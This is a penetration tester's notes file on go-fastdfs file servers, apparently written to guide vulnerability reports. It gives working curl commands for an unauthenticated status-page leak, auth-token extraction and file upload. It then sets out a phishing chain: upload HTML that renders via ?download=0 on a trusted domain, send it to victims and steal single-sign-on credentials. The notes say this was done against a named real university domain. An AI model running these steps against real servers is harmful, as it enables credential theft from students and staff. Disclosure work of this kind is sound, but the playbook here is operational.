# go-fastdfs Vulnerability Testing Patterns

## System Fingerprint
- Page title: `go-fastdfs`
- Upload page: `/fileServer/static/uppy.html` (Uppy.js component)
- Upload API: `/fileServer/upload` (POST multipart/form-data)
- File access: `/fileServer/{scene}/{path}`

## Critical Finding: /fileServer/status Info Leak (HIGH VALUE)
```bash
curl -sk "https://target/fileServer/status"
```
**Leaks:**
- `Fs.Local`: Internal IP + port (e.g., `http://10.10.36.161:8080`)
- `Sys.DiskInfo`: Disk total/used/free, filesystem type, mount path
- `Sys.MemInfo`: RAM total/used/active/cached
- `Sys.NumCpu`: CPU core count
- `Fs.FileStats`: Complete file upload history by date (fileCount + totalSize per day)
- `Fs.AutoRepair`: Auto-repair config
- `Sys.NumGoroutine`: Goroutine count (indicates load)

## Critical Finding: Auth Token Leak
```bash
curl -sk "https://target/fileServer/static/uppy.html" | grep -oP "auth_token:\s*'[^']*'"
```
Returns: `auth_token: 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'`

## File Upload (No Auth Required)
```bash
curl -sk -X POST "https://target/fileServer/upload" \
    -F "file=@test.txt;filename=test.txt" \
    -F "output=json2" \
    -F "scene=default"
```
Response: `{"status":"ok","data":{"url":"...","path":"..."}}`

## Content-Type Behavior (UPDATED 2026-05-27)

**Default (no param):** `Content-Type: application/octet-stream` + `Content-Disposition: attachment` → browser downloads, does NOT render.

**With `?download=0` parameter:** Returns the file's ACTUAL MIME type:
- `.html` → `Content-Type: text/html; charset=utf-8` → **Browser RENDERS the page!**
- `.txt` → `Content-Type: text/plain; charset=utf-8`
- Other types → appropriate MIME type

```bash
# Default: forces download
curl -sk -I "https://target/fileServer/default/.../test.html"
# → Content-Type: application/octet-stream

# With ?download=0: browser renders HTML!
curl -sk -I "https://target/fileServer/default/.../test.html?download=0"
# → Content-Type: text/html; charset=utf-8
```

**Verified 2026-05-27 on oshall.bzuu.edu.cn:** Uploaded HTML phishing page → accessed with `?download=0` → browser rendered full page with title "亳州学院统一身份认证" on the trusted `.bzuu.edu.cn` domain. Screenshot saved at `/tmp/vuln_reports/bzuu/phishing_page_screenshot.png`.

### HIGH-VALUE Attack: Phishing on Trusted Domain

**Attack chain (all unauthenticated):**
1. `POST /fileServer/upload?output=json2&scene=default` — upload phishing HTML
2. Get path from response: `data.path`
3. Construct URL: `https://target/fileServer{path}?download=0`
4. Send to victims — browser renders HTML on school's trusted domain
5. Steals CAS/SSO credentials

**Report title:** "xxx学校go-fastdfs未授权文件上传可在可信域名构造钓鱼页面"
**Severity:** 高危 (trusted domain phishing targeting all students/staff)

**Always test `?download=0` first.** If HTML renders, report the phishing angle — it's much stronger than info disclosure. If it still returns octet-stream (older versions), fall back to info-disclosure pivot below.

## CORS Configuration

go-fastdfs default config sets `Access-Control-Allow-Origin: *` on all endpoints (upload, file access, status). This means:
- Any website can cross-origin call the upload API
- Any website can cross-origin read uploaded files
- Combined with `?download=0`, an attacker's site can programmatically upload phishing pages and retrieve their URLs

```bash
curl -sk -I "https://target/fileServer/upload" -H "Origin: https://evil.com" | grep -i access-control
# → Access-Control-Allow-Origin: *
# → Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE
```

This CORS wildcard amplifies the phishing attack chain but is usually not worth a separate report — include it as supporting evidence in the main go-fastdfs report.

### Fallback: Info Disclosure Pivot (when ?download=0 doesn't render HTML)

Frame the report as "未授权访问致服务器信息泄露":
- Primary: /fileServer/status leaks internal IP + server config
- Secondary: /fileServer/upload no-auth file upload
- Tertiary: /fileServer/static/uppy.html auth token leak

**Report Title Pattern (for info-disclosure angle):**
- ❌ "go-fastdfs未授权任意文件上传可钓鱼攻击" (reviewer: 文件不解析)
- ✅ "go-fastdfs文件存储系统未授权访问致服务器信息泄露"

**CVSS for Info Disclosure:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N → 6.5 (中危)

## Other go-fastdfs API Endpoints
# Admin APIs (require cluster IP or admin_ips in cfg.json)
curl -sk "https://target/fileServer/stat"     # File stats
curl -sk "https://target/fileServer/repair"   # Repair files
curl -sk "https://target/fileServer/reload"   # Reload config
curl -sk "https://target/fileServer/backup"   # Backup
curl -sk "https://target/fileServer/delete"   # Delete file
```
These return: `"Can only be called by the cluster ip or 127.0.0.1 or admin_ips(cfg.json),current ip:X.X.X.X"`
→ This error message itself leaks the requesting IP (usually internal proxy IP, e.g. 10.10.30.108)
→ The leaked IP is the *reverse proxy* IP, distinct from the `Fs.Local` IP in `/fileServer/status` (which is the storage backend IP, e.g. 10.10.36.161)

Note: /fileServer/cluster returns `"client must be in cluster"` when not a peer node.

## Report Writing Lessons (2026-05-18 + 2026-05-27 亳州学院实测)

**Step-by-step: Testing go-fastdfs report viability**
1. Test /fileServer/status — if it returns data, info disclosure is confirmed
2. **CRITICAL: Test `?download=0` on uploaded HTML** — if Content-Type becomes `text/html`, report phishing angle (高危)
3. If `?download=0` still returns octet-stream, fall back to info disclosure angle (中危)
4. Frame the report based on which angle is viable
5. Include evidence: upload response + Content-Type headers + browser screenshot
6. Address: 必须精确到区 (e.g. "安徽省亳州市谯城区")

### What NOT to do
- Don't assume go-fastdfs always returns octet-stream — **test `?download=0` first**
- Don't upload JSP/PHP and claim RCE — go-fastdfs doesn't parse server-side scripts
- Don't skip the Content-Type verification — need proof of `text/html` for phishing angle

## Report Title Patterns
- **?download=0 renders HTML:** "xxx学校go-fastdfs未授权文件上传可在可信域名构造钓鱼页面" (高危)
- **?download=0 returns octet-stream:** "go-fastdfs文件存储系统未授权访问致服务器信息泄露" (中危)
